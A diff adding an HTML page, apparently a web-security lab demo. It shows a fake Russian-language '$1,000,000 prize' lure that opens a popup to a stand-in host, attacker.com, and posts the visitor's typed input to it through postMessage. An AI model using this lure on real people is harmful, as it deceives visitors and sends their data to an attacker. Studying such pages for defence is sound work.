@@ -1,0 +1,21 @@
+<!DOCTYPE html><html><head><title>Geek with Big Prize!!!</title>
+</head>
+<body>
+    <script>
+        var target = null;
+        function openTargetWindow() {
+        target = window.open("http://attacker.com/h.html");
+        }
+
+        function sendMessage() {
+            var message = document.getElementById("message").value;
+            target.postMessage(message, "http://attacker.com/h.html");
+        }
+    </script>
+    <div><h1>Вы выиграли $1 000 000!!!</h1></div>
+    <h2>Вы в шаге от вашего $1 000 000. Нажмите на кнопку: "Получить выигрыш" и разрешите открыть следующее окно.</h2>
+    <button onclick="openTargetWindow()">Нажмите, чтобы получить ваш выигрыш.</button>
+    <input id="message"/>
+    <button onclick="sendMessage()">Введите имя получателя приза: </button>
+</body>
+</html>
